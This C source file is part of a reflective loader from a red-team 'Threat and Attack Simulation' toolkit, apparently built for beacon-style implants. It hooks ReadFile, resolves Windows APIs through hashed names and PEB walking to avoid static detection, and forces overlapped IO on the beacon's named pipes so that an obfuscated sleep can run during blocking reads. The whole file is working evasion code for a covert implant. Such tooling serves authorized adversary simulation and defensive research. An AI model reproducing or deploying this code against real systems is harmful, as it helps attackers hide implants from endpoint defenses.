/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( GetOverlappedResult );
	D_API( NtCreateEvent );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
	D_API( ReadFile );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_GETOVERLAPPEDRESULT	0x92473976 /* GetOverlappedResult */
#define H_API_NTCREATEEVENT		0x28d3233d /* NtCreateEvent */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */
#define H_API_READFILE			0x84d15061 /* ReadFile */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Determines if the handle is a named pipe server.
 * If it is, we are required to use the overlapped
 * IO.
 *
 * Forces the overlapped IO to simulate a blocking
 * operation to mimic the original behavior while
 * being able to obfuscate for periods at a time.
 *
!*/
D_SEC( D ) BOOLEAN WINAPI ReadFile_Hook( _In_ HANDLE hFile, _Out_ LPVOID lpBuffer, _In_ DWORD nNumberOfBytesRead, _Out_ LPDWORD lpNumberOfBytesRead, _Inout_ LPOVERLAPPED lpOverlapped )
{
	API			Api;
	OVERLAPPED		Ovl;
	UNICODE_STRING		Uni;

	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;
	BOOLEAN			Ret = FALSE;
	BOOLEAN			Asn = FALSE;

	PVOID			Evt = NULL;
	PVOID			K32 = NULL;
	PTABLE			Tbl = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PPIPE_ENTRY_BEACON	Peb = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ovl, sizeof( Ovl ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.NtCreateEvent        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATEEVENT );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );
	Api.NtClose              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Load kernel32.dll */
	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );

	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		Api.GetOverlappedResult = PeGetFuncEat( K32, H_API_GETOVERLAPPEDRESULT );
		Api.ReadFile            = PeGetFuncEat( K32, H_API_READFILE );

		/* Get the pointers we need */
		Tbl = C_PTR( G_SYM( Table ) );
		Hdr = C_PTR( & Tbl->Table->PipeList );
		Ent = C_PTR( Hdr->Flink );

		/* Enumerate through each pipe handle */
		for ( ; Ent != Hdr ; Ent = C_PTR( Ent->Flink ) ) {
			Peb = C_PTR( CONTAINING_RECORD( Ent, PIPE_ENTRY_BEACON, PipeList ) );

			/* Is this our pipe? */
			if ( Peb->Pipe == C_PTR( hFile ) ) {
				/* Force IO */
				Asn = TRUE;
				break;
			};
		};

		/* Are we hooking? */
		if ( Asn ) 
		{
			/* Create an overlapped synchronization event */
			if ( NT_SUCCESS( Api.NtCreateEvent( &Ovl.hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {

				/* Call the readfile operation */
				Ret = Api.ReadFile( hFile, lpBuffer, nNumberOfBytesRead, lpNumberOfBytesRead, &Ovl );

				/* Is this a pending operation or did it fail ? */
				if ( Ret != TRUE ) {
					/* What was the last error? */
					if ( NtCurrentTeb()->LastErrorValue == ERROR_IO_PENDING ) {
						/* Block until the operation completes */
						Nst = ObfNtWaitForSingleObject( Ovl.hEvent, FALSE, NULL );

						/* Get the result. */
						Ret = Api.GetOverlappedResult( hFile, &Ovl, lpNumberOfBytesRead, FALSE );
					};
				};

				/* Close the event */
				Api.NtClose( Ovl.hEvent );
			};
		} else 
		{
			/* Execute ReadFile as normal */
			Ret = Api.ReadFile( hFile, lpBuffer, nNumberOfBytesRead, lpNumberOfBytesRead, lpOverlapped );
		};
		Api.LdrUnloadDll( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ovl, sizeof( Ovl ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Return */
	return Ret;
};

#endif
